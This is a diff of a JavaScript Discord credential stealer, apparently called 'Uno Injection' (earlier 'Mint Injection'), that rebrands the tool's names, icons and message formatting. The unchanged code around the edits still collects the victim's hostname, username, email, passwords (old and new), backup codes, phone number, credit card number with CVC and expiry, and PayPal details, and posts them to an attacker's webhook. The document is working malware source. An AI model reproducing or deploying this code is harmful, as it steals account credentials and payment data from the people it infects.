@@ -145,9 +145,9 @@ const request = async (method, url, headers, data) => {
 };
 
 const hooker = async (content, token, account) => {
-    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "Mint -  injection";
-    content["avatar_url"] = "https://media.discordapp.net/attachments/1211774107012698123/1211775467829596180/DALLE_2024-02-26_21.40.25_-_Design_a_sophisticated_and_minimalist_icon_for_a_company_named_Mint_ideal_for_digital_use._The_icon_should_embody_the_essence_of_freshness_with_a_m.webp?ex=65ef6cd9&is=65dcf7d9&hm=6eec5418732f3c506124515212bf5b52f87a2f3385a9b7d32313c757882859dd&";
+    content["content"] = "```" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
+    content["username"] = "Uno -  injection";
+    content["avatar_url"] = "https://th.bing.com/th/id/R.4544190a3bcfee381bb6fb68e84023aa?rik=oa8DvqNXdfJUGQ&riu=http%3a%2f%2fwww.actionfigureinsider.com%2fwpress%2fwp-content%2fuploads%2f2018%2f11%2fUno-icon-1024.png&ehk=w0nbqk38QrW48VflWrAm23FLOQhS%2fAbA1i6I6Yw%2fFwA%3d&risl=&pid=ImgRaw&r=0";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -155,8 +155,8 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "Mint Injection | Zeubrkk",
-        "icon_url": "https://media.discordapp.net/attachments/1211774107012698123/1211775467829596180/DALLE_2024-02-26_21.40.25_-_Design_a_sophisticated_and_minimalist_icon_for_a_company_named_Mint_ideal_for_digital_use._The_icon_should_embody_the_essence_of_freshness_with_a_m.webp?ex=65ef6cd9&is=65dcf7d9&hm=6eec5418732f3c506124515212bf5b52f87a2f3385a9b7d32313c757882859dd&",
+        "text": "Uno Injection | Zeubrkk",
+        "icon_url": "https://th.bing.com/th/id/R.4544190a3bcfee381bb6fb68e84023aa?rik=oa8DvqNXdfJUGQ&riu=http%3a%2f%2fwww.actionfigureinsider.com%2fwpress%2fwp-content%2fuploads%2f2018%2f11%2fUno-icon-1024.png&ehk=w0nbqk38QrW48VflWrAm23FLOQhS%2fAbA1i6I6Yw%2fFwA%3d&risl=&pid=ImgRaw&r=0",
     };
     content["embeds"][0]["title"] = "Account Information";
 
@@ -194,7 +194,7 @@ const hooker = async (content, token, account) => {
     });
 
     for (const embed in content["embeds"]) {
-        content["embeds"][embed]["color"] = 0xa6d8c2;
+        content["embeds"][embed]["color"] = 0x000000;
     }
 
     await request("POST", CONFIG.webhook, {
@@ -318,11 +318,11 @@ const EmailPassToken = async (email, password, token, action) => {
         "embeds": [{
             "fields": [{
                 "name": "Email",
-                "value": "`" + email + "`",
+                "value": "```" + email + "```",
                 "inline": true
             }, {
                 "name": "Password",
-                "value": "`" + password + "`",
+                "value": "```" + password + "```",
                 "inline": true
             }]
         }]
@@ -352,11 +352,11 @@ const BackupCodesViewed = async (codes, token) => {
                 },
                 {
                     "name": "Email",
-                    "value": "`" + account.email + "`",
+                    "value": "```" + account.email + "```",
                     "inline": true
                 }, {
                     "name": "Phone",
-                    "value": "`" + (account.phone || "None") + "`",
+                    "value": "```" + (account.phone || "None") + "```",
                     "inline": true
                 }
             ]
@@ -375,11 +375,11 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
         "embeds": [{
             "fields": [{
                 "name": "New Password",
-                "value": "`" + newPassword + "`",
+                "value": "```" + newPassword + "```",
                 "inline": true
             }, {
                 "name": "Old Password",
-                "value": "`" + oldPassword + "`",
+                "value": "```" + oldPassword + "```",
                 "inline": true
             }]
         }]
@@ -396,15 +396,15 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
         "embeds": [{
             "fields": [{
                 "name": "Number",
-                "value": "`" + number + "`",
+                "value": "```" + number + "```",
                 "inline": true
             }, {
                 "name": "CVC",
-                "value": "`" + cvc + "`",
+                "value": "```" + cvc + "```",
                 "inline": true
             }, {
                 "name": "Expiration",
-                "value": "`" + month + "/" + year + "`",
+                "value": "```" + month + "/" + year + "```",
                 "inline": true
             }]
         }]
@@ -421,11 +421,11 @@ const PaypalAdded = async (token) => {
         "embeds": [{
             "fields": [{
                 "name": "Email",
-                "value": "`" + account.email + "`",
+                "value": "```" + account.email + "```",
                 "inline": true
             }, {
                 "name": "Phone",
-                "value": "`" + (account.phone || "None") + "`",
+                "value": "```" + (account.phone || "None") + "```",
                 "inline": true
             }]
         }]
@@ -521,11 +521,11 @@ async function updateCheck() {
         "embeds": [{
             "fields": [{
                 "name": "Email",
-                "value": "`" + account.email + "`",
+                "value": "```" + account.email + "```",
                 "inline": true
             }, {
                 "name": "Phone",
-                "value": "`" + (account.phone || "None") + "`",
+                "value": "```" + (account.phone || "None") + "```",
                 "inline": true
             }]
         }]
